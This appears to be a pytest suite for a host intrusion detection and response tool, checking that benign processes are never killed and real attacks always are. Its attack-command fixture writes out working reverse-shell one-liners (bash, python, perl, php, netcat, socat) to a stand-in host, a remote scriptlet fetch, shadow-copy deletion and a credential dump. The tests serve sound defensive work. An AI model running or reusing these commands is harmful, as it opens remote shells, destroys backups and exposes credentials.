"""What actually gets done about what, using the shipped rules and real scoring.

This file is the safety contract. The first version of the responder decided by score
alone, and the score moved with host load, so busy hosts killed legitimate services
while calm hosts ignored real backdoors. Each case below runs with the host calm and
with the anomaly model at its maximum, and the answer must not change.
"""

import pytest

from analyzer import anomaly_detector, rule_engine
from analyzer.anomaly_detector import Scorer
from collectors.process_checks import ProcessFacts, inspect, load_indicators
from common.runtime import now_iso

CALM, FRANTIC = 0.0, 100.0
DESTRUCTIVE = {"kill_process", "lock_user"}


def event(kind, **fields):
    return {"ts": now_iso(), "type": kind, **fields}


def failures(ip="203.0.113.5", user="root", count=5):
    return [event("auth_fail", ip=ip, user=user) for _ in range(count)]


def process(kind, proc, pid=4242, **meta):
    return event(kind, pid=pid, user="www-data", meta={"proc": proc, **meta})


def plan_for(events, anomaly, paths, config, monkeypatch):
    """Run events through the real engine and scorer, with host anomaly pinned."""
    engine = rule_engine.build_engine(config)
    scorer = Scorer(config, paths)
    monkeypatch.setattr(scorer, "ml_score", lambda metrics, at=None: anomaly)
    steps = []
    for item in events:
        for alert in engine.evaluate(item):
            steps += scorer.score_alert(alert)["plan"]
    return steps


BENIGN = {
    "busy database": [process("suspicious_proc", "postgres", flags=["cpu"], cpu=95.0)],
    "memory-hungry build": [process("suspicious_proc", "rustc", flags=["mem"], mem=88.0)],
    "service opening a port": [
        event("new_port", port=8443, pid=778, meta={"proc": "nginx", "exposed": True})
    ],
    "unexpected privileged port": [
        event("new_port", port=23, pid=9, meta={"proc": "telnetd", "exposed": True})
    ],
    "new account": [event("user_add", user="newhire", meta={"uid": 1001})],
    "admin running nmap": [process("suspicious_proc", "nmap", flags=["name"])],
    "download piped to a shell": [
        process("malicious_command", "bash", confidence="medium", summary="x", indicator="y")
    ],
    "binary in /tmp": [process("temp_binary", "installer")],
    "package upgraded under a service": [process("deleted_binary", "someapp")],
    "login after no attack": [event("auth_success", ip="203.0.113.9", user="alice")],
}


@pytest.mark.parametrize("anomaly", [CALM, FRANTIC], ids=["calm", "frantic"])
@pytest.mark.parametrize("name", BENIGN)
def test_ordinary_activity_is_never_killed_or_locked(name, anomaly, paths, config, monkeypatch):
    # Regression: postgres at high CPU scored 76 and nginx on 8443 scored 70, which were
    # enough to kill them. A busy host is not evidence of anything.
    steps = plan_for(BENIGN[name], anomaly, paths, config, monkeypatch)
    assert not DESTRUCTIVE & {step["action"] for step in steps}


MALICIOUS = {
    "netcat backdoor": (
        [event("new_port", port=23, pid=4242, meta={"proc": "nc", "exe": "/usr/bin/nc", "exposed": True})],
        {("kill_process", "4242")},
    ),
    "cryptominer": (
        [process("suspicious_proc", "xmrig", flags=["malicious"])],
        {("kill_process", "4242")},
    ),
    "reverse shell": ([process("reverse_shell", "bash")], {("kill_process", "4242")}),
    "web shell": ([process("webshell_spawn", "sh", parent="nginx")], {("kill_process", "4242")}),
    "payload running from memory": ([process("fileless_process", "x")], {("kill_process", "4242")}),
    "known attack command": (
        [process("malicious_command", "bash", confidence="high", summary="x", indicator="y")],
        {("kill_process", "4242")},
    ),
    "UID 0 account": (
        [event("user_add", user="ghost", meta={"uid": 0})], {("lock_user", "ghost")}
    ),
    "account changed to UID 0": (
        [event("user_mod", user="bob", meta={"new_uid": 0})], {("lock_user", "bob")}
    ),
    "brute force that worked": (
        failures(user="alice") + [event("auth_success", ip="203.0.113.5", user="alice")],
        {("block_ip", "203.0.113.5"), ("lock_user", "alice")},
    ),
    "brute forced root": (
        failures() + [event("auth_success", ip="203.0.113.5", user="root")],
        {("block_ip", "203.0.113.5"), ("lock_user", "root")},
    ),
    "plain brute force": (failures(), {("block_ip", "203.0.113.5")}),
    "password spray": (
        [event("auth_fail", ip="203.0.113.6", user=f"u{i}") for i in range(5)],
        {("block_ip", "203.0.113.6")},
    ),
    "key-only brute force": (
        [event("auth_probe", ip="203.0.113.7", user="git") for _ in range(10)],
        {("block_ip", "203.0.113.7")},
    ),
    "username enumeration": (
        [event("auth_probe", ip="203.0.113.8", user=f"u{i}") for i in range(5)],
        {("block_ip", "203.0.113.8")},
    ),
}


@pytest.mark.parametrize("anomaly", [CALM, FRANTIC], ids=["calm", "frantic"])
@pytest.mark.parametrize("name", MALICIOUS)
def test_real_attacks_get_a_response_however_quiet_the_host(name, anomaly, paths, config, monkeypatch):
    # Regression: a netcat backdoor scored 60 on a calm host and got no response at all.
    events, expected = MALICIOUS[name]
    steps = plan_for(events, anomaly, paths, config, monkeypatch)
    assert expected <= {(step["action"], step["target"]) for step in steps}


def events_from_command(cmdline, config):
    """Run a raw command line through the real indicators, as the collector does."""
    facts = ProcessFacts(pid=4242, name=cmdline[0], exe=f"/usr/bin/{cmdline[0]}", cmdline=cmdline, user="deploy")
    events = []
    for finding in inspect(facts, load_indicators(config)):
        meta = {"proc": facts.name, "exe": facts.exe, **finding["meta"]}
        events.append(event(finding["type"], pid=4242, user="deploy", msg=facts.name, meta=meta))
    return events


ORDINARY_COMMANDS = {
    "port health check": ["bash", "-c", "exec 3<>/dev/tcp/10.99.0.1/22"],
    "wrapped health check": ["timeout", "4", "bash", "-c", "exec 3<>/dev/tcp/10.99.0.1/22"],
    "health check by redirect": ["bash", "-c", "</dev/tcp/db.internal/5432"],
    "ssh through a proxy": ["ssh", "-o", "ProxyCommand=nc -x proxy:1080 %h %p", "-C", "host"],
    "tar into a folder": ["tar", "-xzf", "nc.tar.gz", "-C", "/opt"],
    "chocolatey install": [
        "powershell", "-c",
        "iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))",
    ],
    "provisioning script": ["bash", "-c", "echo $SETUP | base64 -d | bash"],
    "python port check": [
        "python3", "-c", "import socket,subprocess; s=socket.socket(); s.connect(('db',5432)); subprocess.run(['true'])",
    ],
    "admin clearing a log": ["wevtutil", "cl", "Application"],
    "socat port forward": ["socat", "TCP-LISTEN:8080,fork", "EXEC:/usr/local/bin/handler"],
    "netcat port scan": ["nc", "-zv", "db.internal", "5432"],
    "curl install script": ["sh", "-c", "curl -fsSL https://get.docker.com | sh"],
    "encoded powershell from a management tool": ["powershell", "-enc", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"],
    "certutil hashing a file": ["certutil", "-hashfile", "x.iso", "SHA256"],
    "searching for attack text": ["grep", "-r", "bash -i >& /dev/tcp/1.2.3.4/80 0>&1", "."],
}


@pytest.mark.parametrize("anomaly", [CALM, FRANTIC], ids=["calm", "frantic"])
@pytest.mark.parametrize("name", ORDINARY_COMMANDS)
def test_ordinary_command_lines_are_never_killed(name, anomaly, paths, config, monkeypatch):
    # Regression: all of these reached kill_process. The tests before this one set the
    # confidence by hand, so nothing covered the step from a raw command line to a verdict.
    events = events_from_command(ORDINARY_COMMANDS[name], config)
    steps = plan_for(events, anomaly, paths, config, monkeypatch)
    assert not DESTRUCTIVE & {step["action"] for step in steps}


ATTACK_COMMANDS = {
    "bash reverse shell": ["bash", "-c", "bash -i >& /dev/tcp/203.0.113.77/4444 0>&1"],
    "sh reverse shell": ["sh", "-c", "sh -i >& /dev/udp/203.0.113.77/4444 0>&1"],
    "file descriptor reverse shell": ["bash", "-c", "exec 196<>/dev/tcp/203.0.113.77/4444; sh <&196 >&196 2>&196"],
    "netcat with exec": ["nc", "-e", "/bin/sh", "203.0.113.77", "4444"],
    "netcat listener with exec": ["ncat", "-lvp", "4444", "-c", "bash"],
    "socat shell": ["socat", "tcp-connect:203.0.113.77:4444", "EXEC:/bin/bash,pty,stderr"],
    "python reverse shell": [
        "python3", "-c",
        "import socket,os,pty;s=socket.socket();s.connect(('203.0.113.77',4444));os.dup2(s.fileno(),0);pty.spawn('/bin/sh')",
    ],
    "perl reverse shell": ["perl", "-e", "use Socket;socket(S,PF_INET,SOCK_STREAM,0);exec('/bin/sh -i');"],
    "php reverse shell": ["php", "-r", "$s=fsockopen('203.0.113.77',4444);exec('/bin/sh -i <&3 >&3 2>&3');"],
    "ransomware removing backups": ["vssadmin.exe", "delete", "shadows", "/all", "/quiet"],
    "remote scriptlet": ["regsvr32", "/s", "/n", "/u", "/i:http://203.0.113.77/x.sct", "scrobj.dll"],
    "dumping credentials": ["rundll32.exe", "comsvcs.dll,", "MiniDump", "624", "C:\\x.dmp", "full"],
}


@pytest.mark.parametrize("anomaly", [CALM, FRANTIC], ids=["calm", "frantic"])
@pytest.mark.parametrize("name", ATTACK_COMMANDS)
def test_real_attack_command_lines_are_stopped(name, anomaly, paths, config, monkeypatch):
    events = events_from_command(ATTACK_COMMANDS[name], config)
    steps = plan_for(events, anomaly, paths, config, monkeypatch)
    assert ("kill_process", "4242") in {(step["action"], step["target"]) for step in steps}


def test_every_high_indicator_names_its_programs(config):
    for indicator in load_indicators(config).commands:
        if indicator.confidence == "high":
            assert indicator.programs, indicator.id


def test_host_load_can_only_ever_raise_a_score():
    for severity in range(1, 11):
        assert anomaly_detector.combine_scores(severity, 0.0) == severity * 10
        assert anomaly_detector.combine_scores(severity, 1.0) == 100


@pytest.mark.parametrize("severity", [9, 10])
def test_critical_alerts_are_not_diluted_by_a_calm_host(severity):
    assert anomaly_detector.combine_scores(severity, 0.0) >= 90


def test_shipped_destructive_rules_never_depend_on_the_score():
    for rule in rule_engine.load_rules():
        for step in rule.get("respond") or []:
            if step["action"] in DESTRUCTIVE:
                assert "min_score" not in step, rule["id"]


@pytest.mark.parametrize("action", sorted(DESTRUCTIVE))
def test_a_rule_cannot_make_a_destructive_action_depend_on_score(action, tmp_path):
    rules = tmp_path / "rules.yml"
    rules.write_text(
        "rules:\n"
        "  - id: x\n    match: y\n    alert_type: z\n    severity: 5\n    reason: r\n"
        f"    respond:\n      - {{action: {action}, min_score: 50}}\n",
        encoding="utf-8",
    )
    with pytest.raises(rule_engine.RuleError, match="busy host"):
        rule_engine.load_rules(rules)


def test_a_custom_rule_can_trigger_a_response(tmp_path, paths, config):
    # Regression: response logic was a fixed list of alert types, so any new rule was
    # "Unhandled alert type" and could never do anything.
    rules = tmp_path / "rules.yml"
    rules.write_text(
        "rules:\n"
        "  - id: mine\n    match: my_event\n    alert_type: mine\n    severity: 6\n    reason: r\n"
        "    criteria: {group_by: ip}\n    respond:\n      - {action: block_ip}\n",
        encoding="utf-8",
    )
    engine = rule_engine.RuleEngine(rule_engine.load_rules(rules), config)
    alert = engine.evaluate(event("my_event", ip="203.0.113.3"))[0]
    assert Scorer(config, paths).score_alert(alert)["plan"] == [
        {"action": "block_ip", "target": "203.0.113.3"}
    ]


def test_min_score_gates_a_reversible_step(tmp_path, paths, config, monkeypatch):
    rules = tmp_path / "rules.yml"
    rules.write_text(
        "rules:\n"
        "  - id: mine\n    match: my_event\n    alert_type: mine\n    severity: 5\n    reason: r\n"
        "    criteria: {group_by: ip}\n    respond:\n      - {action: block_ip, min_score: 70}\n",
        encoding="utf-8",
    )
    engine = rule_engine.RuleEngine(rule_engine.load_rules(rules), config)
    scorer = Scorer(config, paths)
    alert = engine.evaluate(event("my_event", ip="203.0.113.3"))[0]

    monkeypatch.setattr(scorer, "ml_score", lambda metrics, at=None: 0.0)
    assert scorer.score_alert(alert)["plan"] == []
    monkeypatch.setattr(scorer, "ml_score", lambda metrics, at=None: 100.0)
    assert scorer.score_alert(alert)["plan"] != []
